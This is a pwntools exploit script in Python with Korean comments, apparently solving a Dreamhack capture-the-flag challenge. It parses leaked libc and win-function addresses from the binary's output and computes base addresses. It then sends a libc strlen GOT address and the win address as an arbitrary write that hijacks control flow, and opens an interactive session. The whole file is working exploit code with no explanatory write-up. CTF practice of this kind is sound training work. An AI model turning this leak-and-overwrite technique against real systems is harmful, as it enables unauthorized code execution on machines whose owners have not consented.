#!/usr/bin/env python3
from pwn import *

# ================= 기본 설정 =================
context.arch = "amd64"
context.binary = elf = ELF('./main_patched')
context.gdb_binary = "gdb-pwndbg"
#context.log_level = "debug"

# ================= 원격 정보 =================
HOST, PORT = "host3.dreamhack.games 19579".split()

# ================= I/O =================
s   = lambda data               : p.send(data)
sa  = lambda delim, data        : p.sendafter(delim, data)
sl  = lambda data               : p.sendline(data)
sla = lambda delim, data        : p.sendlineafter(delim, data)

r   = lambda num=4096           : p.recv(num)
rl  = lambda                    : p.recvline()
ru  = lambda delim, drop=True   : p.recvuntil(delim, drop)

# ================= Leak Helpers =================
l64  = lambda : u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))

# ================= 연결 =================
if args.REMOTE:
    p = remote(HOST, int(PORT))
elif args.DOCK:
    p = remote("127.0.0.1", 1234)
else:
    p = process(env={"LD_PRELOAD": "./libc.so.6"})
    # gdb.attach(p)

libc = ELF("./libc.so.6")

# ================= 실행 =================

def slog(n, a): return success(": ".join([n, hex(a)]))

ru(b"stdout: ")
lb = int(rl().strip(), 16) - libc.sym["_IO_2_1_stdout_"]

ru(b"win: ")
win = int(rl().strip(), 16)
pie_base = win - 0x1230 # offset 빼기

slog("libc_Base", lb)
slog("pie_base", win)

#gdb.attach(p)
#pause()

strlen = lb + 0x219098#libc.sym["strlen"]

sla(b': ', str(strlen).encode())
sla(b': ', str(win).encode())

p.interactive()
